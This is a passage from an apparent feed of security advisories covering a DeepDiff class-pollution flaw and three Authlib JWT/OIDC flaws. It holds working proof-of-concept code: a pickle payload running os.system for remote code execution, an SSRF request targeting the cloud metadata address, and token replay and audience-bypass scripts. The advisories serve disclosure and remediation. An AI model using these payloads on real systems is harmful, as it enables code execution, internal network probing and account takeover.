                ("root", "GETATTR"),
                ("__init__", "GETATTR"),
                ("__globals__", "GETATTR"),
                ("PWNED", "GET"),
            ): 1337
        }
    },
)

Going back to the possible inputs of Delta, when it takes a bytes as input, it uses pickle to deserialize them. Care was taken by DeepDiff to prevent arbitrary code execution via the SAFE_TO_IMPORT allow list. https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/serialization.py#L62-L98 However, using the class pollution in the Delta, an attacker can add new entries to this set.

This then allows a second call to Delta to unpickle an insecure class that runs os.system, for example.

Using dict

Usually, class pollution does not work when traversal starts at a dict/list/tuple, because it is not possible to reach __globals__ from there. However, using two calls to Delta (or just one call if the target dictionary that already contains at least one entry) it is possible to first change one entry of the dictionary to be of type deepdiff.helper.Opcode, which then allows traversal to __globals__, and notably sys.modules, which in turn allows traversal to any module already loaded by Python. Passing Opcode around can be done via pickle, which Delta will happily accept given it is in the default allow list.

Proof of Concept

With deepdiff 8.6.0 installed, run the following scripts for each proof of concept. All input to Delta is assumed to be user-controlled.

Denial of Service

This script will pollute the value of builtins.int, preventing the class from being used and making code crash whenever invoked.

# ------------[ Setup ]------------
import pickle

from deepdiff.helper import Opcode

pollute_int = pickle.dumps(
    {
        "values_changed": {"root['tmp']": {"new_value": Opcode("", 0, 0, 0, 0)}},
        "dictionary_item_added": {
            (
                ("root", "GETATTR"),
                ("tmp", "GET"),
                ("__repr__", "GETATTR"),
                ("__globals__", "GETATTR"),
                ("__builtins__", "GET"),
                ("int", "GET"),
            ): "no longer a class"
        },
    }
)


assert isinstance(pollute_int, bytes)

# ------------[ Exploit ]------------
# This could be some example, vulnerable, application.
# The inputs above could be sent via HTTP, for example.

from deepdiff import Delta

# Existing dictionary; it is assumed that it contains
# at least one entry, otherwise a different Delta needs to be
# applied first, adding an entry to the dictionary.
mydict = {"tmp": "foobar"}

# Before pollution
print(int("41") + 1)

# Apply Delta to mydict
result = mydict + Delta(pollute_int)

print(int("1337"))

$ python poc_dos.py
42
Traceback (most recent call last):
  File "/tmp/poc_dos.py", line 43, in <module>
    print(int("1337"))
TypeError: 'str' object is not callable

Remote Code Execution

This script will create a file at /tmp/pwned with the output of id.

# ------------[ Setup ]------------
import os
import pickle

from deepdiff.helper import Opcode

pollute_safe_to_import = pickle.dumps(
    {
        "values_changed": {"root['tmp']": {"new_value": Opcode("", 0, 0, 0, 0)}},
        "set_item_added": {
            (
                ("root", "GETATTR"),
                ("tmp", "GET"),
                ("__repr__", "GETATTR"),
                ("__globals__", "GETATTR"),
                ("sys", "GET"),
                ("modules", "GETATTR"),
                ("deepdiff.serialization", "GET"),
                ("SAFE_TO_IMPORT", "GETATTR"),
            ): set(["posix.system"])
        },
    }
)


# From https://davidhamann.de/2020/04/05/exploiting-python-pickle/
class RCE:
    def __reduce__(self):
        cmd = "id > /tmp/pwned"
        return os.system, (cmd,)


# Wrap object with dictionary so that Delta does not crash
rce_pickle = pickle.dumps({"_": RCE()})

assert isinstance(pollute_safe_to_import, bytes)
assert isinstance(rce_pickle, bytes)

# ------------[ Exploit ]------------
# This could be some example, vulnerable, application.
# The inputs above could be sent via HTTP, for example.

from deepdiff import Delta

# Existing dictionary; it is assumed that it contains
# at least one entry, otherwise a different Delta needs to be
# applied first, adding an entry to the dictionary.
mydict = {"tmp": "foobar"}

# Apply Delta to mydict
result = mydict + Delta(pollute_safe_to_import)

Delta(rce_pickle)  # no need to apply this Delta

$ python poc_rce.py
$ cat /tmp/pwned
uid=1000(dtc) gid=100(users) groups=100(users),1(wheel)

Who is affected?

Only applications that pass (untrusted) user input directly into Delta are affected.

While input in the form of bytes is the most flexible, there are certainly other gadgets, depending on the application, that can be used via just a dictionary. This dictionary could easily be parsed, for example, from JSON. One simple example would be overriding app.secret_key of a Flask application, which would allow an attacker to sign arbitrary cookies, leading to an authentication bypass.

Mitigations

A straightforward mitigation is preventing traversal through private keys, like it is already done in the path parser. This would have to be implemented in both deepdiff.path._get_nested_obj and deepdiff.path._get_nested_obj_and_force, and possibly in deepdiff.delta.Delta._get_elements_and_details. Example code that raises an error when traversing these properties:

if elem.startswith("__") and elem.endswith("__"):
  raise ValueError("traversing dunder attributes is not allowed")

However, if it is desirable to still support attributes starting and ending with __, but still protect against this vulnerability, it is possible to only forbid __globals__ and __builtins__, which stops the most serious cases of class pollution (but not all). This was the solution adopted by pydash: https://github.com/dgilland/pydash/issues/180

References

  • https://github.com/seperman/deepdiff/security/advisories/GHSA-mw26-5g2v-hqw3
  • https://github.com/dgilland/pydash/issues/180
  • https://github.com/dgilland/pydash/commit/2015f0a4bcdbc3a5b27652e38fe97b3ee13ac15f
  • https://nvd.nist.gov/vuln/detail/CVE-2025-58367
  • https://github.com/seperman/deepdiff/commit/c69c06c13f75e849c770ade3f556cd16209fd183
  • https://github.com/seperman/deepdiff/releases/tag/8.6.1
  • https://github.com/pypa/advisory-database/tree/main/vulns/deepdiff/PYSEC-2026-327.yaml
  • https://pypi.org/project/deepdiff
  • https://github.com/advisories/GHSA-mw26-5g2v-hqw3

Reporter: Cavan Loughran, Celvex Group Inc.

Summary

Authlib's symmetric (oct) key handling accepts an empty key (empty bytes b'' / empty string '') as a valid HMAC signing and verification key. An empty HMAC key produces a deterministic digest that any party can reproduce, so an attacker who knows (or can cause) the application to verify a token with an empty key can forge arbitrary tokens that pass HS256/HS384/HS512 signature verification. This is the Authlib member of the cross-language empty-HMAC-key family already assigned CVE-2026-44351 (fast-jwt, npm) and CVE-2026-45363 (ruby-jwt, RubyGems).

This is DISTINCT from Authlib's existing recent JWT-verification advisories. It is not closed by CVE-2026-27962 / GHSA-wvwj-cvrp-7pv5 (JWS JWK header injection, the key=None case), nor by CVE-2026-28802 / GHSA-7wc2-qxgw-g8gg (alg:none blank-signature bypass), nor by GHSA-5357-c2jx-v7qh (algorithm confusion with asymmetric public keys). Those address header-driven key injection, the none algorithm, and asymmetric-vs-symmetric confusion respectively; none of them rejects a zero-length oct key.

Affected versions

Authlib <= 1.7.2 (latest release 1.7.2, 2026-05-06). Confirmed present at the v1.7.2 release tag and on the current main HEAD. The affected code is in authlib/jose/rfc7518/oct_key.py and authlib/jose/rfc7518/jws_algs.py.

Root cause (exact code location, release tag v1.7.2)

  • authlib/jose/rfc7518/oct_key.py, class OctKey:
    • validate_raw_key is a type-only check: return isinstance(key, bytes). An empty bytes object passes.
    • import_key rejects only keys whose material starts with known unsafe prefixes (if raw_key.startswith(POSSIBLE_UNSAFE_KEYS): raise ValueError(...), i.e. PEM/SSH prefixes). Empty bytes do not match any unsafe prefix, so b'' is accepted.
    • get_op_key loads the raw key without validating its length.
    • No check anywhere rejects a zero-length key, so an empty key b'' passes every gate.
  • authlib/jose/rfc7518/jws_algs.py, class HMACAlgorithm:
    • prepare_key: return OctKey.import_key(raw_data).
    • sign / verify call key.get_op_key(...) then hmac.new(op_key, msg, self.hash_alg) / hmac.compare_digest(...). With an empty op key this becomes hmac.new(b'', ...): a deterministic, publicly reproducible digest. There is no empty-key or minimum-length check.

Why this is a real signature bypass

An empty HMAC key makes the signature a public, deterministic function of the header and payload, so anyone can compute a valid signature and forge tokens. The realistic trigger matches the sibling CVEs: the deploying application sources the verification key from a place that can be empty at runtime, for example os.environ.get('JWT_SECRET', ''), a database/config column whose default is '', or a key-resolver that returns '' on a miss. Authlib is widely used to BUILD token verifiers (OAuth 2.0 resource servers, OIDC relying parties), and Authlib's own recent advisory history shows the JWS/JWT verify path is the live attack surface, so a key-resolution path that can yield '' is a realistic exposure.

Reproduction (prose, no weaponized exploit)

  1. In an application that uses Authlib to verify JWS/JWT, arrange for the verification key to be an empty value (e.g. an unset environment variable defaulted to '').
  2. An attacker constructs a token with header {alg: HS256} and an arbitrary payload, and computes the HS256 signature using an empty key (a value any party can reproduce because the key is empty).
  3. Authlib's HMAC verification accepts the token as validly signed, because OctKey.import_key did not reject the empty key and hmac.compare_digest matches the attacker-computable digest. The forged token is treated as authentic.

No live system was probed; the above describes the class. The vulnerable code path and the absent guard are confirmed by direct reading of the public source at the v1.7.2 tag and on current main.

Proof the fix is known-good (no novelty risk)

The same maintainer's newer JOSE library, joserfc, ALREADY rejects empty oct key material outright. In src/joserfc/_rfc7518/oct_key.py, import_key raises a ValueError on empty oct material, with an explicit note that an empty oct key produces a deterministic HMAC digest that any party can reproduce, allowing trivial signature forgery in JWS HS256/HS384/HS512 verification. (joserfc additionally warns on keys below 112 bits.) The same guard is simply absent from the older, far more widely deployed Authlib rfc7518 package. The flagship Python JOSE libraries also guard: PyJWT raises InvalidKeyError('HMAC key must not be empty.') for zero-length keys, and jwcrypto enforces an RFC 7518 minimum key length.

Impact

Token forgery / authentication bypass in OAuth 2.0 resource servers and OIDC relying parties built on Authlib whenever the HMAC verification key can be empty at runtime. An attacker can mint tokens with arbitrary claims (for example elevated scopes or another user's subject) that pass signature verification.

Suggested remediation

Reject empty oct key material in OctKey.import_key (and/or validate_raw_key), exactly as the maintainer's joserfc library already does, before the key can reach hmac.new in HMACAlgorithm.sign / verify. Consider also adopting joserfc's sub-112-bit minimum-length warning/rejection for HMAC keys.

Disclosure

Reporter: Cavan Loughran, Celvex Group Inc.

References

  • https://github.com/authlib/authlib/security/advisories/GHSA-8m4g-j4wp-wgcg
  • https://nvd.nist.gov/vuln/detail/CVE-2026-114616
  • https://github.com/authlib/authlib/commit/4ff30db442c70e29486e1982cb0ad37c037f5f4b
  • https://github.com/authlib/authlib/releases/tag/v1.9.1
  • https://github.com/advisories/GHSA-8m4g-j4wp-wgcg

items.content_html:
Summary

Authlib's RFC 9101 (JAR) extension passes the attacker-controlled request_uri authorization parameter straight to the get_request_object() fetch hook with no validation, at a pre-authentication endpoint. Authlib already defines the pre-registration allowlist for this (request_uris client metadata and require_request_uri_registration server metadata) but the extension never consults it, and both docstrings instruct integrators to implement the hook as an unrestricted requests.get(request_uri). Deployments following the documented pattern get an unauthenticated SSRF primitive.

Details

Verified against authlib 1.7.2 and current main. All line numbers below are from authlib/oauth2/rfc9101/authorization_server.py.

The extension registers itself on the before_get_authorization_grant hook (lines 62-65), so it runs on every authorization request before any user or client authentication. support_request_uri defaults to True (line 58).

The only gate before the sink is that client_id names an existing client (lines 91-103). A client_id is a public, non-secret identifier.

The sink at line 159 forwards the raw parameter with no scheme, host, or allowlist check:

def _get_raw_request_object(self, request: OAuth2Request) -> str:
    if "request_uri" in request.payload.data:
        raw_request_object = self.get_request_object(
            request.payload.data["request_uri"]
        )
        if not raw_request_object:
            raise InvalidRequestUriError(state=request.payload.state)

get_request_object is abstract (line 213, raise NotImplementedError() at line 225), so authlib itself performs no outbound request. The defect is that authlib supplies unvalidated attacker input to that extension point and then documents the insecure implementation twice — in the class docstring (lines 34-38) and in the hook's own docstring (lines 218-223):

def get_request_object(self, request_uri: str):
    try:
        return requests.get(request_uri).text
    except requests.Exception:
        return None

Two points sharpen this beyond a generic documentation issue:

  • The allowlist already exists and is ignored. Authlib validates request_uris as client metadata (authlib/oauth2/rfc7591/claims.py:319) and require_request_uri_registration as server metadata (authlib/oauth2/rfc8414/models.py:263). The rfc9101 package contains zero references to either name, so the pre-registration model is never enforced at the point of use.
  • RFC 9101 §10.4.1 asks for controls that are absent. It states the server should "a) check that the value of the request_uri parameter does not point to an unexpected location, b) check that the media type of the response is application/oauth-authz-req+jwt, c) implement a timeout for obtaining the content of request_uri, and d) not perform recursive GET on the request_uri." The extension implements none of these and the documented example implements none of them either.

The two failure paths are distinguishable, which supplies the inference channel for a blind SSRF: a falsy fetch result raises InvalidRequestUriError (invalid_request_uri, lines 162-163), while a successful fetch of non-JWT content raises InvalidRequestObjectError (invalid_request_object, line 186).

PoC

This demonstrates the library-level defect with no network egress required: it shows the unvalidated URI reaching the fetch hook pre-authentication.

python -m venv .venv && .venv/bin/pip install authlib

from authlib.oauth2.rfc6749.requests import BasicOAuth2Payload, OAuth2Request
from authlib.oauth2.rfc9101 import JWTAuthenticationRequest

reached = []


class Extension(JWTAuthenticationRequest):
    def get_request_object(self, request_uri):
        reached.append(request_uri)  # the docstring puts requests.get(request_uri) here
        return None

    def resolve_client_public_key(self, client):
        return {"keys": []}

    def get_server_metadata(self):
        return {}

    def get_client_require_signed_request_object(self, client):
        return False


class AuthorizationServer:
    def query_client(self, client_id):
        return object()


uri = "http://169.254.169.254/latest/meta-data/"
request = OAuth2Request("GET", "https://as.example/authorize")
request.payload = BasicOAuth2Payload({"client_id": "demo", "request_uri": uri})

try:
    Extension().parse_authorization_request(AuthorizationServer(), request)
except Exception as exc:
    print("error:", type(exc).__name__)

print("fetch hook received:", reached)

Output on authlib 1.7.2:

error: InvalidRequestUriError
fetch hook received: ['http://169.254.169.254/latest/meta-data/']

Against a deployment that used the docstring implementation, the equivalent unauthenticated request is:

GET /authorize?response_type=code&client_id=demo&request_uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F

Returning a fetched-but-non-JWT body instead of None in the snippet above yields InvalidRequestObjectError rather than InvalidRequestUriError, showing the oracle that distinguishes a reachable target from an unreachable one.

Impact

Server-side request forgery, reachable without authentication by anyone who knows a valid client_id. In a deployment that implemented get_request_object as documented, an attacker can make the authorization server issue GET requests to arbitrary URLs: internal-only services, cloud metadata endpoints such as 169.254.169.254, and side-effectful internal GET routes. The invalid_request_uri versus invalid_request_object split, together with response timing, provides an oracle for internal host and port discovery. RFC 9101 §10.4.1 additionally notes the DoS and recursive-lookup risks that the missing timeout and recursion checks leave open.

Response bodies are consumed as a JWT and never reflected, so this is a blind primitive rather than direct data exfiltration. Because the fetch executes in integrator code, deployments that already allowlist inside their override are unaffected — but authlib provides no hook to make that the default, ships support_request_uri=True, and its documentation steers integrators to the unsafe implementation, so the insecure outcome is the expected one.

References

  • https://github.com/authlib/authlib/security/advisories/GHSA-x4rv-c3wx-4cr8
  • https://nvd.nist.gov/vuln/detail/CVE-2026-114620
  • https://github.com/authlib/authlib/pull/949
  • https://github.com/authlib/authlib/commit/6563f6f7a8c2f71d2f85ee7511d72a4fbae3acc0
  • https://github.com/authlib/authlib/commit/891e3f10ae5989176211f8be35dcc7cd40aa92c6
  • https://github.com/authlib/authlib/releases/tag/v1.9.0
  • https://github.com/advisories/GHSA-x4rv-c3wx-4cr8

items.content_html:
Summary

OpenIDMixin.parse_id_token() reads the nonce_supported claim from the ID token it is validating. When that claim is boolean false, the expected nonce is set to None and nonce validation is skipped for that token.

An ID token that carries this claim is therefore accepted in a session whose nonce does not match. A captured, validly signed ID token belonging to a victim can be replayed into an attacker-controlled session, authenticating the attacker as the victim at the relying party.

The code is identical in authlib/integrations/base_client/sync_openid.py:82-83 and authlib/integrations/base_client/async_openid.py:84-85, so all framework integrations are affected. Fixed versions: none; reproduced on 1.8.0 (commit c529a61a).

Preconditions: the ID token must carry a valid signature and pass iss and aud validation, and the attacker must be able to supply it to parse_id_token(). Authorization code flow is not affected. Implicit and hybrid relying parties, and applications calling parse_id_token() directly, are affected.

Details

Affected code

authlib/integrations/base_client/sync_openid.py:80-85, in parse_id_token():

claims = claims_cls(token.claims, token.header, claims_options, claims_params)
# https://github.com/authlib/authlib/issues/259
if claims.get("nonce_supported") is False:
    claims.params["nonce"] = None

claims.validate(leeway=leeway)

authlib/integrations/base_client/async_openid.py:82-86 contains the same code.

Source of the claim

claims is constructed from token.claims, which is the decoded payload of the ID token passed to parse_id_token():

token = jwt.decode(
    token["id_token"],
    key=key_set,
    registry=JWSRegistry(algorithms=alg_values, strict_check_header=False),
)
...
claims = claims_cls(token.claims, token.header, claims_options, claims_params)

claims.get("nonce_supported") therefore resolves against the ID token payload. It is not read from load_server_metadata(), from client configuration, or from any other source under the relying party's control.

Effect on validation

IDToken.validate_nonce() at authlib/oidc/core/claims.py:69-83 performs the comparison only when the expected value is truthy:

nonce_value = self.params.get("nonce")
if nonce_value:
    if "nonce" not in self:
        raise MissingClaimError("nonce")
    if nonce_value != self["nonce"]:
        raise InvalidClaimError("nonce")

Assigning claims.params["nonce"] = None makes nonce_value falsy, so both the presence check and the equality check are skipped. No error is raised and claims.validate() completes normally.

The docstring of that same method states the requirement:

If present in the ID Token, Clients MUST verify that the nonce Claim Value is equal to the value of the nonce parameter sent in the Authentication Request.

Trigger condition

The comparison is is False, so only a JSON boolean false activates the branch. A string value "false" does not, and nonce validation proceeds normally in that case.

Origin

The branch was added in commit 3ca7333c ("Skip verifying nonce for Apple case") to accommodate a provider that emits a nonce_supported claim, as referenced by the inline comment pointing to issue #259.

Remediation

Read the flag from server metadata or client configuration rather than from the token:

metadata = self.load_server_metadata()
if metadata.get("nonce_supported") is False:
    claims.params["nonce"] = None

This preserves the behavior for relying parties configured against a provider that does not support nonces, while preventing the token from determining whether it is subject to nonce validation.

Proof of concept

Environment

  • authlib 1.8.0, commit c529a61a (tag v1.8.0)
  • Python 3.14
  • joserfc 1.7.5
  • No network access required
git clone https://github.com/authlib/authlib.git && cd authlib
git checkout c529a61a
python3 -m venv .venv
.venv/bin/pip install -e . joserfc==1.7.5
.venv/bin/python poc.py

Configuration

The relying party is a subclass of the shipped OpenIDMixin supplying only client_id and load_server_metadata(). fetch_jwk_set() returns metadata["jwks"] directly when the key set is present in metadata, so no HTTP request is made and no part of the validation path is stubbed.

The signing key is a generated RSA key. All three tokens are signed with it, carry iss and aud matching the relying party configuration, and are within their validity window. The relying party's session nonce is nonce-the-rp-actually-generated; every token carries the different nonce nonce-from-the-captured-token.

poc.py

from joserfc import jwt
from joserfc.jwk import RSAKey
from authlib.integrations.base_client.sync_openid import OpenIDMixin

ISSUER = "https://as.example"
CLIENT_ID = "rp-client"
KEY = RSAKey.generate_key(2048, parameters={"kid": "k1"})
JWKS = {"keys": [KEY.as_dict(private=False)]}


class RP(OpenIDMixin):
    client_id = CLIENT_ID

    def load_server_metadata(self):
        return {"issuer": ISSUER, "jwks": JWKS}


def id_token(nonce, sub="victim", nonce_supported=None):
    claims = {"iss": ISSUER, "sub": sub, "aud": CLIENT_ID,
              "iat": 1000000000, "exp": 4000000000, "auth_time": 1000000000}
    if nonce is not None:
        claims["nonce"] = nonce
    if nonce_supported is not None:
        claims["nonce_supported"] = nonce_supported
    return jwt.encode({"alg": "RS256", "kid": "k1"}, claims, KEY)


rp = RP()
SESSION_NONCE = "nonce-the-rp-actually-generated"
CAPTURED_NONCE = "nonce-from-the-captured-token"

cases = [
    ("[1] no nonce_supported claim", None),
    ("[2] nonce_supported: false", False),
    ("[3] nonce_supported: \"false\"", "false"),
]

for label, flag in cases:
    tok = {"access_token": "AT",
           "id_token": id_token(CAPTURED_NONCE, nonce_supported=flag)}
    try:
        user = rp.parse_id_token(tok, nonce=SESSION_NONCE)
        print(f"{label:34s} -> ACCEPTED sub={user['sub']}")
    except Exception as e:
        print(f"{label:34s} -> REJECTED {type(e).__name__}: {e}")

Expected result

All three cases carry a nonce that does not match the relying party's session nonce, so all three should be rejected.

Observed result

[1] no nonce_supported claim       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'
[2] nonce_supported: false         -> ACCEPTED sub=victim
[3] nonce_supported: "false"       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'

Case [1] shows nonce validation rejecting a mismatched nonce under normal conditions. Case [2] differs from case [1] only by the addition of the nonce_supported claim and is accepted, returning the subject of the replayed token. Case [3] confirms the branch requires a JSON boolean.

The script exits 0 and produces identical output across three runs.

Impact

Type of vulnerability

Reliance on an untrusted input in a security decision (CWE-807), resulting in authentication bypass by capture-replay (CWE-294).

The nonce binds an ID token to the browser session that requested it and is the control that prevents a token issued for one session being presented in another. Because the flag that governs this check is read from the token itself, the check can be disabled by the data it is applied to.

Who is impacted

OpenID Connect relying parties built on authlib's client integrations where an attacker can supply an ID token to parse_id_token():

  • Implicit flow relying parties, where the ID token is returned in the URL fragment.
  • Hybrid flow relying parties, where the ID token is returned in the fragment or by form post.
  • Applications calling parse_id_token() directly on externally supplied input.

Both the synchronous and asynchronous integrations are affected, so Flask, Django and Starlette deployments are equally exposed.

Relying parties using plain authorization code flow are not impacted, as the ID token is retrieved from the token endpoint over TLS following a state lookup and cannot be substituted by an attacker.

Consequence

An attacker in possession of a victim's ID token replays it into their own session. Nonce validation is skipped, parse_id_token() returns a UserInfo for the victim's subject, and the relying party establishes an authenticated session as the victim. This grants access to the victim's account at that relying party, including any data and actions available through it.

The token must carry a valid signature and pass iss and aud validation, so the vulnerability does not permit forging tokens or authenticating as an arbitrary subject. It removes the replay protection from a genuine token that has been captured, for example from browser history, a Referer header, proxy or server logs, or a shared device.

Mitigation available to integrators

None. The check is performed inside parse_id_token(), and no parameter or configuration option is exposed to disable the behaviour or to override the nonce handling.

References

items.content_html:
Description

Summary

Authlib's default RFC 7523 JWT bearer grant leaves get_audiences() empty, so verify_claims() only checks that an aud claim exists instead of requiring it to match the current authorization server's token endpoint. An attacker holding a legitimately issued JWT assertion for any audience can present it to a different authorization server sharing the same signing key and obtain an access token.

To be completely transparent, AI tools helped surface it. However, we have independently reproduced and carefully validated the issue. We follow responsible disclosure practices and are sharing this privately.

Affected Entrypoints

  • authlib.oauth2.rfc7523.JWTBearerGrant — default get_audiences() returns empty list
  • authlib.jose.jwt.decode() with claims_options for audience validation
  • authlib.integrations.flask_oauth2.ResourceProtector.validate_request() when audience checking is enabled

Exploit Path

1. Attacker authenticates to Service A (low-privilege)
2. Authorization server issues JWT with "aud": "https://evil.test/token"
3. Attacker presents this assertion to Service B's token endpoint
4. Service B uses default JWTBearerGrant (get_audiences() = [])
5. verify_claims() only checks aud *exists*, not its value
6. Service B issues an access token — audience bypass achieved

Proof of Concept

#!/usr/bin/env python3
"""
Demonstrates that the default JWTBearerGrant accepts JWT assertions
whose audience does not match the token endpoint, while a strict
audience override correctly rejects them.
"""
import json
import os
import sys

from joserfc.jwk import KeySet, OctKey

WRONG_AUDIENCE = "https://evil.test/token"
EXPECTED_AUDIENCE = "https://provider.test/token"
GRANT_TYPE = "urn:ietf:params:oauth:grant-type:jwt-bearer"


def build_and_exercise(strict_audience: bool) -> tuple[int, dict]:
    from authlib.oauth2.rfc7523 import JWTBearerGrant as BaseJWTBearerGrant
    # Uses Authlib's own Flask test fixtures
    from tests.flask.test_oauth2.models import Client, User, db
    from tests.flask.test_oauth2.oauth2_server import (
        create_authorization_server, create_flask_app,
    )

    class JWTBearerGrant(BaseJWTBearerGrant):
        def resolve_issuer_client(self, issuer):
            return Client.query.filter_by(client_id=issuer).first()

        def resolve_client_public_key(self, client):
            return KeySet([
                OctKey.import_key("foo", {"kid": "1"}),
                OctKey.import_key("bar", {"kid": "2"}),
            ])

        def authenticate_user(self, subject):
            return None

        def has_granted_permission(self, client, user):
            return True

        # Only override get_audiences when testing strict mode
        if strict_audience:
            def get_audiences(self):
                return [EXPECTED_AUDIENCE]

    app = create_flask_app()
    os.environ["AUTHLIB_INSECURE_TRANSPORT"] = "true"

    with app.app_context():
        db.init_app(app)
        db.create_all()

        user = User(username="demo-user")
        db.session.add(user)
        db.session.commit()

        client = Client(
            user_id=user.id,
            client_id="client-id",
            client_secret="client-secret",
        )
        client.set_client_metadata({
            "scope": "profile",
            "redirect_uris": ["https://client.test/authorized"],
            "grant_types": [GRANT_TYPE],
        })
        db.session.add(client)
        db.session.commit()

        server = create_authorization_server(app)
        server.register_grant(JWTBearerGrant)

        # Sign assertion with WRONG audience
        assertion = JWTBearerGrant.sign(
            "foo",
            issuer="client-id",
            audience=WRONG_AUDIENCE,  # <-- Not the expected audience
            subject=None,
            header={"alg": "HS256", "kid": "1"},
        )

        rv = app.test_client().post(
            "/oauth/token",
            data={"grant_type": GRANT_TYPE, "assertion": assertion},
        )
        body = json.loads(rv.data)
        db.session.remove()
        db.drop_all()
        return rv.status_code, body


def main() -> int:
    # Test 1: Default grant (no audience enforcement)
    vuln_status, vuln_body = build_and_exercise(strict_audience=False)

    # Test 2: Strict audience grant (correct behavior)
    strict_status, strict_body = build_and_exercise(strict_audience=True)

    result = {
        "wrong_audience": WRONG_AUDIENCE,
        "expected_audience": EXPECTED_AUDIENCE,
        "vulnerable_status": vuln_status,
        "vulnerable_body": vuln_body,
        "strict_status": strict_status,
        "strict_body": strict_body,
    }
    print(json.dumps(result, indent=2, sort_keys=True))

    if (
        vuln_status == 200
        and "access_token" in vuln_body
        and strict_body.get("error") == "invalid_grant"
    ):
        print(
            "POC_SUCCESS: default JWTBearerGrant issued an access token for "
            "an assertion whose aud did not match the token endpoint, while "
            "strict audience validation rejected the same assertion."
        )
        return 0

    print("POC_FAILURE: expected token issuance under default grant "
          "and invalid_grant under strict audience control.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

Observed Result

  • Default grant (vulnerable): HTTP 200, access_token issued despite aud: "https://evil.test/token"
  • Strict grant (fixed): HTTP 400, error: "invalid_grant" — correctly rejects mismatched audience
  • Confirms the default get_audiences() returns empty, so audience validation is effectively skipped

Impact

  • Vulnerability Type: CWE-287 — Improper Authentication
  • An attacker with a valid JWT assertion for any service can use it to obtain tokens from a different service sharing the same signing keys
  • Particularly dangerous in microservice architectures where services share identity infrastructure
  • Enables unauthorized access escalation across trust boundaries
  • The vulnerability is in the default behavior — most integrations won't override get_audiences()

Credit

Reported by a security research team from the University of Sydney, focusing on detecting open source software vulnerabilities. Liyi Zhou: https://lzhou1110.github.io/ Ziyue Wang: https://zyy0530.github.io/ Strick: https://str1ckl4nd.github.io/ Maurice: https://maurice.busystar.org/ Chenchen Yu: https://7thparkk.github.io/

References

  • https://nvd.nist.gov/vuln/detail/CVE-2026-114618
